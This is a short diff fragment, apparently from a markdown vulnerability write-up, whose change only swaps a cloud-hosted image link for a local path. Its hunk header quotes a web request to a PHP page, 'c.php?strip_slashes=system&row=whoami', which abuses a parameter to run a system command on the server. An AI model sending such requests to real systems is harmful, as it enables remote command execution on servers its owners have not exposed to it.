@@ -23,7 +23,7 @@ https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami
 
 
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091913721.png)
+![img](./images/202202091913721.png)
 
 
 
